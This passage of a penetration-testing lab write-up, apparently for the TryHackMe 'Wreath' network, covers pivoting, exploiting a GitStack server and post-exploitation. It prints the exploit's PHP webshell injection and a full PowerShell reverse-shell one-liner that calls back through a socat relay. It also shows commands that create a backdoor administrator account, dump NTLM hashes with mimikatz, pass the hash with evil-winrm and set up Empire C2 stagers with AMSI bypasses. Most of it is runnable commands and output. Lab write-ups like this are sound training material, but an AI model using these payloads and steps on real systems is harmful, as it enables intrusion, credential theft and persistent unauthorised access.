We also need to append `&`

Then enter username and password

Successful response:

`c: Connected to server.`

3. Run sshuttle with key based auth

Use `--ssh-cmd` switch followed by `ssh -i keyfile`

`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`

eg. `sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`

> Note: error may occur if it is part of subnet you are trying to access

```
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```

```
kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24
c : Connected to server.
client_loop: send disconnect: Broken pipe
c : fatal: ssh connection to server (pid 38010) exited with returncode 255
```

ie. connecting to `172.16.0.5` and forward `172.16.0.0/24`. Including compromised server inside the newly forwarded subnet

We can get around this with `-x` to create connection without disrupting itself

eg. `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`

```
kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200
c : Connected to server.
```

</details>

## 12. Pivoting - Conclusion

<details>
  <summary>---</summary>

- There are many ways to pivot through a network
- Proxychains and FoxyProxy are used to access a proxy
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows. Can create reverse SSH connections
- Socat can redirect connection and create port forwards
- Chisel can do the same thing as SSH port forwarding / tunnelling. Does not require SSH on the box
- sshuttle is nicer to create proxy when we have SSH access on target

</details>

## 13. Git Server- Enumeration

<details>
  <summary>---</summary>


Ping scan - `100` and `150` up

```
[root@prod-serv tmp]# ./nmap-Neozer0 -sn 10.200.81.1-255 -oN scan-Neozer0

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-13 11:29 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-1.eu-west-1.compute.internal (10.200.81.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00035s latency).
MAC Address: 02:8C:E0:55:7B:89 (Unknown)
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Host is up (0.00014s latency).
MAC Address: 02:6E:4F:DD:1B:65 (Unknown)
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Host is up (-0.10s latency).
MAC Address: 02:AD:06:35:A5:CB (Unknown)
Nmap scan report for ip-10-200-81-250.eu-west-1.compute.internal (10.200.81.250)
Host is up (0.00022s latency).
MAC Address: 02:E7:4E:C8:80:A7 (Unknown)
Nmap scan report for ip-10-200-81-200.eu-west-1.compute.internal (10.200.81.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.73 seconds
```

Scanning 100 returns filtered
```
[root@prod-serv tmp]# ./nmap-Neozer0 10.200.81.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-14 10:17 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 6150 scanned ports on ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100) are filtered
MAC Address: 02:6E:4F:DD:1B:65 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.54 seconds
```

Scanning 150 returns a result
```
[root@prod-serv tmp]# ./nmap-Neozer0 10.200.81.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-13 11:57 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00049s latency).
Not shown: 6142 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  epmap
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
47001/tcp open  winrm
MAC Address: 02:AD:06:35:A5:CB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 574.74 seconds
```

Scanning first 15000 port
```
[root@prod-serv tmp]# ./nmap-Neozer0 -p1-15000 10.200.85.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-16 23:49 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00083s latency).
Not shown: 14997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:4C:02:6B:0D:57 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 280.32 seconds
```

</details>

## 14. Git Server - Pivoting

<details>
  <summary>---</summary>

Port 80 is interesting in 10.200.81.150.
We use sshuttle to ssh tunnel to 150 through 200 from the attacking machine

### ssh tunnel

Attacking box - this runs in the background with `-fN`
```
kali@kali:~/thm/wreath$ ssh -i ssh/webserver_id_rsa -L 8000:10.200.81.150:80 root@10.200.81.200 -fN
```

We navigate to `localhost:8000` and see an error page that tells us various accessible routes eg. `/gitstack`

![error page](gitPivot.png)

We navigate to `localhost:8000/gitstack` and see a log in page - default creds do not work

![gitstack](gitstack.png)

### sshuttle

TODO

Use searchsploit on gitstack
```
kali@kali:~/thm/wreath$ searchsploit gitstack
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
GitStack - Remote Code Execution                                                                                                                                    | exploits/php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                                                                                                  | exploits/windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                                                                                                             | exploits/php/webapps/43777.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

</details>

## 15. Git Server - Code (exploit) Review

<details>
  <summary>---</summary>

Download the potential RCE found with searchsploit
```
kali@kali:~/thm/wreath$ searchsploit -m 43777
  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43777
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/thm/wreath/43777.py
```

Exploit copied might have DOS line endings. We can use a tool to convert this if this is the case
```
dos2unix ./43777.py
```
or
```
sed -i 's/\r//' ./EDBID.py
```

Check what version python this would run on with `print` statements (`print()` for python3 and `print ""` for python2)

1. Add shebang `#!/usr/bin/python2` so we can run `./43777.py`; or 
2. Run with python2 `python2 43777.py` without adding shebang to the file

Change the ip address to `localhost:8000` (ssh port forward method)

Change the ip address to target IP eg `10.200.85.150` (sshuttle method)

```python
ip = 'localhost:8000'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'
```

The command `whoami` will be run on execution

Last six lines of the exploit:
```python
print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```

These create PHP webshell `<?php system($_POST['a']); ?>` and echo it into `exploit.php` under webroot.

This can be accessed by posting a command to `/web/exploit.php`

</details>

## 16. Git Server - Exploitation

<details>
  <summary>---</summary>

> Note: For port forwarding method we use target: `localhost:8000`
> 
> Note: For sshuttle method we use target: `gitserver.thm`

### sshuttle method

First add `gitserver.thm` to `/etc/hosts`

```
kali@kali:~/thm/wreath$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.200.85.200   thomaswreath.thm
10.200.85.150   gitserver.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Start a sshuttle connection
```
kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200
c : Connected to server.
```

Run `43777.py` exploit with ip value of `10.200.85.150` - this exploit will live in `IP/web/exploit-Neozer0.php`

```
kali@kali:~/thm/wreath$ python2 43777.py 
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system
" 
```

Two options for reverse shell:
1. Change the command from `whoami` inside the exploit file but we need to run the exploit every time
2. Leverage same webshell to execute more commands without performing exploit twice 

We choose option 2 as it is quieter 

Webshell uploaded responds to POST request with param `a`. So we can do a curl - `curl -X POST http://IP/web/exploit.php -d "a=COMMAND"`

```
kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=whoami"
"nt authority\system
" 
```

Instead of curl we can also use burp proxy

1. Do a GET request to `http://gitserver.thm`
2. Intercept and send to repeater
3. Change method to a POST
4. Add `Content-Type: application/x-www-form-urlencoded`
5. Add `a=COMMAND`

![burp webshell command](burp-webshell.png)

Find hostname - `git-serv`
```
kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=hostname"
"git-serv
" 
```

Find OS  - `Windows`
```
kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=systeminfo"
"
Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-70000-00000-AA368
Original Install Date:     08/11/2020, 13:19:49
System Boot Time:          17/04/2021, 01:06:51
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 24/08/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,381 MB
Virtual Memory: Max Size:  2,432 MB
Virtual Memory: Available: 1,876 MB
Virtual Memory: In Use:    556 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4580422
                           [02]: KB4512577
                           [03]: KB4580325
                           [04]: KB4587735
                           [05]: KB4592440
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.85.1
                                 IP address(es)
                                 [01]: 10.200.85.150
                                 [02]: fe80::24c6:6f4d:2503:aaa2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
" 
```

We now need to check if the compromised server can access the outside world internet. 

- `tcpdump` capture
- `ping` to our IP

1. On our attacking machine: run `tcpdump` with `tun0` interface - `tcpdump -i tun0 icmp`. If our VPN is not using the `tun0` interface, we can check with `ip -a link`
2. On compromised server: run `ping -n 3 ATTACKING_IP`

Attacking machine - start `tcpdump`
```
kali@kali:~/thm/wreath$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Attacking machine - run `ping`
```
kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=ping -n 3 10.50.86.79"
"
Pinging 10.50.86.79 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.86.79:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
" 
```

Unfortunately no ping packets make it to our listener. We have two options

- Copy over `netcat` to our stable webshell in `.200`. Use this is catch a shell there; or
- Setup a relay in `.200` to forward shell back to listener

Lets choose socat relay.

1. Open desired ports in the firewall. This is because CentOS has a wrapper around IPTables firewall called `firewalld`

`firewall-cmd --zone=public --add-port PORT/tcp`

`--zone=public` - apply rule to every inbound connection to this port

Web server .200
```
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 29999/tcp
success
```

2. Set up nc listener on attacking machine
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 30000
listening on [any] 30000 ...
```

3. Set up a relay on .200 (pass through to attacking machine)
```
[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:29999 tcp:10.50.82.56:30000 &
[1] 2902
```

4. Execute a reverse shell

Use this command to get a reverse shell - use web server IP and port that was just opened
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.85.200',29999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Need to url encode the command first if using `curl`

Attacking machine
```
kali@kali:~/thm/wreath$ curl -X POST -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.85.200%27%2C29999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22" http://gitserver.thm/web/exploit-Neozer0.php
```

We receive a shell on our attacking machine!!
```
kali@kali:~/thm/wreath$ sudo nc -lvnp 30000
[sudo] password for kali: 
listening on [any] 30000 ...
connect to [10.50.86.79] from (UNKNOWN) [10.200.85.200] 46412
whoami
nt authority\system
PS C:\GitStack\gitphp> 
```

### Port forward method

The method is similar but the attacking IP is different

We first run a port forward

Attacking box
```
kali@kali:~/thm/wreath$ ssh -i ssh/webserver_id_rsa -L 8000:10.200.85.150:80 root@10.200.85.200 -fN
```

Modify `43777.py` file with ip of `localhost:8000`

Then we run exploit which executes `whoami` which returns `NT AUTHORITY\SYSTEM` - highest ranking local account on Windows

```
kali@kali:~/thm/wreath$ python2 43777.py 
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system
" 
```

We can use curl to run commands (or burp)
```
kali@kali:~/thm/wreath$ curl -X POST http://localhost:8000/web/exploit-Neozer0.php -d "a=whoami"
"nt authority\system
" 
```

Everything else is the same as the sshuttle

</details>

## 17. Git Server - Stabilisation and Post Exploitation

<details>
  <summary>---</summary>

We know two ports are open on target `.150` - 3389 (RDP) and 5985 (WinRM)

We need a user account (rather than service account) with:
- `Remote Desktop Users` group for RDP (`Administrators` group trumps the RDP group)
- `Remote Management Users` group for WinRM. 

Since we already have ultimate access, we can create these accounts

1. Create the account `net user USERNAME PASSWORD /add`
2. Add account in the Administrators and Remote Management Users groups `net localgroup Administrators USERNAME /add` and `net localgroup "Remote Management Users" USERNAME /add`

```
PS C:\GitStack\gitphp> net user Neozer0 taco /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators Neozer0 /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" Neozer0 /add
The command completed successfully.
```

Confirm user and groups
```
PS C:\GitStack\gitphp> net user Neozer0
User name                    Neozer0
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            17/04/2021 12:44:07
Password expires             Never
Password changeable          17/04/2021 12:44:07
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                
Global Group memberships     *None                 
The command completed successfully.
```

We can now access this box with new user login

3. Install winrm `sudo gem install evil-winrm`
4. Connect to target `evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`

for SSH port forward - a second tunnel needs to be created to access port 5985 - `-i 127.0.0.1 -P 58950`

```
kali@kali:~/thm/wreath$ evil-winrm -u Neozer0 -p taco -i 10.200.85.150

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Neozer0\Documents> whoami
git-serv\neozer0
*Evil-WinRM* PS C:\Users\Neozer0\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192

```

run xfreerdp to get GUI rdp
```
kali@kali:~/thm/wreath$ xfreerdp /v:10.200.85.150 /u:Neozer0 /p:taco +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
[03:04:23:067] [2154:2155] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[03:04:23:067] [2154:2155] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[03:04:23:067] [2154:2155] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
...
```

We can see a share folder that can be accessed on cli as `\\tsclient\`

![xfreerdp](xfreerdp-share-folder.png)

run cmd as admin and run mimikatz

We can obtain the hashes by using `lsadump::sam`

```
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                                                                                                                                    C:\Windows\system32>\\tsclient\share\mimikatz\x64\mimikatz.exe                                                                                                                                                                                                                            .#####.   mimikatz 2.2.0 (x64) #18362 Jan  4 2020 18:59:26                                                                                 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                       '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                     '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                                                                                                                                                               mimikatz # privilege::debug                                                                                                                 Privilege '20' OK                                                                                                                                                                                                                                                                       mimikatz # token::elevate                                                                                                                   Token Id  : 0                                                                                                                               User name :                                                                                                                                 SID name  : NT AUTHORITY\SYSTEM                                                                                                                                                                                                                                                         672     {0;000003e7} 1 D 20141          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                                      -> Impersonated !                                                                                                                           * Process Token : {0;000b5d45} 2 F 1722298     GIT-SERV\Neozer0        S-1-5-21-3335744492-1614955177-2693036043-1002  (15g,24p)    Primary                                                                                                                                             * Thread Token  : {0;000003e7} 1 D 1795378     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)                                                                                                                                                      mimikatz # log c:\windows\temp\mimikatz.log                                                                                                 Using 'c:\windows\temp\mimikatz.log' for logfile : OK                                                                                                                                                                                                                                   mimikatz # lsadump::sam                                                                                                                     Domain : GIT-SERV                                                                                                                           SysKey : 0841f6354f4b96d21b99345d07b66571                                                                                                   Local SID : S-1-5-21-3335744492-1614955177-2693036043                                                                                                                                                                                                                                   SAMKey : f4a3c96f8149df966517ec3554632cf4                                                                                                                                                                                                                                               RID  : 000001f4 (500)                                                                                                                       User : Administrator                                                                                                                          Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1                                                                                                                                                                                                                                           Supplemental Credentials:                                                                                                                   * Primary:NTLM-Strong-NTOWF *                                                                                                                   Random Value : 68b1608793104cca229de9f1dfb6fbae
...
RID  : 000003e9 (1001)                                                                                                       User : Thomas                                                                                                                  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f                                                                                                                                                                                                             Supplemental Credentials:                                                                                                    * Primary:NTLM-Strong-NTOWF *                                                                                                    Random Value : 03126107c740a83797806c207553cef7                                                                                                                                                                                                       * Primary:Kerberos-Newer-Keys *                                                                                                  Default Salt : GIT-SERVThomas                                                                                                Default Iterations : 4096                                                                                                    Credentials                                                                                                                    aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe                                  aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69                                                                  des_cbc_md5       (4096) : e5add55e76751fbc                                                                                OldCredentials                                                                                                                 aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2                                  aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55                                                                  des_cbc_md5       (4096) : 7f16a47cef890b3b                                                                                                                                                                                                         * Packages *                                                                                                                     NTLM-Strong-NTOWF                                                                                                                                                                                                                                     * Primary:Kerberos *                                                                                                             Default Salt : GIT-SERVThomas                                                                                                Credentials                                                                                                                    des_cbc_md5       : e5add55e76751fbc                                                                                       OldCredentials                                                                                                                 des_cbc_md5       : 7f16a47cef890b3b                                

```

![xfreerdp mimikatz](xfreerdp-mimikatz.png)

Two options to maintain persistent to the server:
1. We can try crack the hash and use the password to log in; or
2. We can use built in pass-the-hash

To pass the hash we use `-H` switch instead of `-p` switch for `evil-winrm`

`evil-winrm -u Administrator -H ADMIN_HASH -i IP`

```
kali@kali:~/thm/wreath$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
git-serv\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

</details>

## 18. Command and Control - Introduction and Install

<details>
  <summary>---</summary>

### Command and Control Framework (C2)

- Used to consolidate attacker's position within a network
- Simplify post-exploitation steps (privesc, AV evasion, pivoting, looting, covert network tactics etc.)
- Eg. Cobalt Strike, Covenant (.NET), Merlin, Shadow, PoshC2, Powershell Empire (Windows)
- C2 matrix to decide between the frameworks
  
### Powershell Empire

- Windows target
- Modules to take initial access to a network of Windows devices and turn into something substantial
- GUI interface `Starkiller`
- Current version Empire 3.x
- Multiple people can connect and collaborate

### Empire and Starkiller - Installation

- Install empire - `sudo apt install powershell-empire`
- Run empire - `sudo powershell-empire --headless`
- Install starkiller - `sudo apt install starkiller`
- Run starkiller - `sudo starkiller`

### Definitions

- Listeners - listens for connection and help with exploitation
- Stagers - payload generated for reverse shell. Deliver agents
- Agents - similar to `session`
- Modules - used with agents for further exploitation eg. dump hashes

### Listeners

- defaults to HTTP listener
- single listeners can be used more than once

```
(Empire) > uselistener 
dbx             http            http_com        http_foreign    http_hop        http_malleable  http_mapi       meterpreter     onedrive        redirector
(Empire) > uselistener http
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.
```

Set variables and execute
```
(Empire: listeners/http) > set Name Webserver
(Empire: listeners/http) > set Host 10.50.86.79
(Empire: listeners/http) > set Port 8000
(Empire: listeners/http) > execute
[*] Starting listener 'Webserver'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > 
```

We can resume listeners with `listeners`
```
(Empire) > listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  Webserver         http            http://10.50.86.79:8000              5/0.0                   

```

### Stagers

- Empire's payloads used to connect back to listeners
- Stagers create agents when executed

There are various stager options. A good one is `multi/launcher`

```
(Empire: listeners) > usestager 
multi/bash                osx/application           osx/macro                 windows/bunny             windows/launcher_lnk      windows/shellcode
multi/launcher            osx/ducky                 osx/pkg                   windows/csharp_exe        windows/launcher_sct      windows/teensy
multi/macro               osx/dylib                 osx/safari_launcher       windows/dll               windows/launcher_vbs      windows/wmic
multi/pyinstaller         osx/jar                   osx/shellcode             windows/ducky             windows/launcher_xml      
multi/war                 osx/launcher              osx/teensy                windows/hta               windows/macro             
osx/applescript           osx/macho                 windows/backdoorLnkMacro  windows/launcher_bat      windows/macroless_msword
```

Looking at `multi/bash`
```
(Empire: listeners) > usestager multi/bash
(Empire: stager/multi/bash) > info

Name: BashScript

Description:
  Generates self-deleting Bash script to execute the
  Empire stage0 launcher.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        python            Language of the stager to generate.
  OutFile          False                         File to output Bash script to, otherwise
                                                 displayed on the screen.
  SafeChecks       True        True              Switch. Checks for LittleSnitch or a
                                                 SandBox, exit the staging process if
                                                 true. Defaults to True.
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  ScriptLogBypass  False       True              Include cobbr's Script Block Log Bypass
                                                 in the stager code.
  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
                                                 the stager code.
  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
                                                 the stager code.
```

We set the listener to our listenere `Webserver` and execute which creates stager in the `/tmp` directory
```
(Empire: stager/multi/bash) > set Listener Webserver
(Empire: stager/multi/bash) > execute
#!/bin/bash
